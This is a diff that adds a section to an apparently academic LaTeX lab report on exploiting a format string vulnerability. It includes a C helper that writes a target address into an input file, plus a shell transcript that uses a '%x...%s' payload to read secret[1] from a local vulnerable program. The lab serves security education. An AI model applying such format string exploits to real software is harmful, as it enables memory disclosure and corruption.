@@ -216,7 +216,76 @@ The new secrets:      0x44 -- 0x1e
 
 Last part of the task was to show if we can perform the four task we executed before if we didn't have the extra \texttt{scanf} method that allows us to store an integer from user input into \texttt{int\_input} variable in the vulnerable program.
 
-In order to execute this task we had to disable virtual memory randomization, so that at every consecutive execution of our program the memory addresses of the \texttt{secret} would stay exactly the same.
+Not having the additional user input doesn't stop us from injecting our desired address into the \texttt{user\_input} array that we use in the second \texttt{scanf}. However we could not specify address from the keyboard, because letters and number of the address would be transformed into ASCII characters, which is not what we need.
+
+We used, however, a program \texttt{write\_file.c} so it can prepare input for us that will contain the address at the beginning.
+
+\vspace{1em}
+\lstset{
+	captionpos=b,
+	frame=single,
+	language=C,
+	caption=Example of overwriting memory with a specified value,
+	label=printf:writefilec,
+	breaklines=true,
+}
+\begin{lstlisting}
+#include <sys/stat.h>
+#include <fcntl.h>
+int main()
+{
+	char buf[1000];
+	int fp, size;
+	unsigned int *address;
+	/* Putting any number you like at the beginning of the format string */
+	address = (unsigned int *) buf;
+	
+	/* Put address of secret[1] in first four bytes */
+	*address = 0x0804b01c;
+	
+	/* Getting the rest of the format string */
+	scanf("%s", buf+4);
+	size = strlen(buf+4) + 4;
+	printf("The string length is %d\n", size);
+	
+	/* Writing buf to "mystring" */
+	fp = open("mystring", O_RDWR | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR);
+	if (fp != -1) {
+		write(fp, buf, size);
+		close(fp);
+	} else {
+	printf("Open failed!\n");
+}
+\end{lstlisting}
+
+In order to execute this task we had to disable virtual memory randomization, so that at every consecutive execution of our program the memory addresses of the \texttt{secret} would stay exactly the same. We needed the address to stay to same, in order to run the vulnerable program once, take note of the address, run our program \texttt{write\_string} that creates a file to be used as input, and run vulnerable program again and be sure that the address space is exactly as during previous run.
+
+\vspace{1em}
+\lstset{
+	captionpos=b,
+	frame=single,
+	language=BASH,
+	caption=Example of overwriting memory with a specified value,
+	label=printf:writefile1,
+	breaklines=true,
+}
+\begin{lstlisting}
+seed@seed-desktop:~/cwk2$ ./write_string
+%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%s
+The string length is 36
+seed@seed-desktop:~/cwk2$ ./vul < mystring
+The variable secret’s address is 0xbffff4e8 (on stack)
+The variable secret’s value is 0x 804b018 (on heap)
+secret[0]’s address is 0x 804b018 (on heap)
+secret[1]’s address is 0x 804b01c (on heap)
+Please enter a string
+bffff4ec.bffff560.bffff554.bffff5f4.0.0.bffff5a0.b7fff670.80482bf.804b018.U
+The original secrets: 0x44 -- 0x55
+The new secrets:      0x44 -- 0x55
+\end{lstlisting}
+
+In the listing~\ref{printf:writefile1} we can see that we run program \texttt{write\_string} which writes into 'myfile'. Then we use myfile as standard input to my program. First four bytes of \texttt{user\_input} now will contain the address of \texttt{secret[1]}. We then specify the rest of format specifier as in previous part of this task. Note that now we have to pop more values off the stack, because \texttt{user\input} is defined at the beginning of the method so it gets pushed to the stack earlier. As the result, when \texttt{user\_input} is at top of the stack and \texttt{printf} 'executes' \texttt{\%s} we print the location stored at the beginning of this buffer. 
+
 
 \section{\texttt{chroot} vulnerability}
 \subsection{Understanding how \texttt{chroot} works}
